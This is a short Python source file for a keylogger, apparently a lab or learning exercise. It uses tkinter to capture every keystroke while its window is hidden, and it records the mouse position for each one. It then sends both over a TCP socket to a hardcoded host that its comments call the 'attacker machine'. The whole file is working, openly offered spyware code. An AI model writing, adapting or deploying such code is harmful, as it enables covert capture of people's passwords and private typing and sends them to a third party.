import tkinter as tk
import socket
import pyautogui

#file = open("keystrokes.txt", "w")

#Establishing connection to the attacker machine using sockets
client_socket = socket.socket() #by default it is SOCK_STREAM (TCP) and has porotocal AF_INET (IPv4) 

client_socket.connect(('192.168.0.102',9999)) #server machine's ip and port on which it will send and recieve connections from



def keypress(event): 
    keyPressed = event.char 
    if event.char == event.keysym:
        mouse = pyautogui.position()
        msg = 'Normal Key %r' % event.char+" mouse : "+str(mouse)
        client_socket.send(bytes(msg,"utf-8"))
    elif len(event.char) == 1:
        mouse = pyautogui.position()
        msg = 'Punctuation Key %r (%r)' % (event.keysym, event.char)+" mouse : "+str(mouse)
        client_socket.send(bytes(msg,"utf-8"))
    else:
        mouse = pyautogui.position()
        msg = 'Special Key %r' % event.keysym+" mouse : "+str(mouse)
        client_socket.send(bytes(msg,"utf-8"))
    if event.keysym == 'Escape':
        msg = "Connection closed by the client!!"
        client_socket.send(bytes(msg,"utf-8"))
        main.destroy()
        client_socket.shutdown(socket.SHUT_RDWR)
    
    print(msg)
    #file.write(keyPressed)

main = tk.Tk() 
print("Press any key (Escape key to exit):")
main.bind_all('<Key>',keypress) 
main.withdraw() 
main.mainloop() 
#file.close()
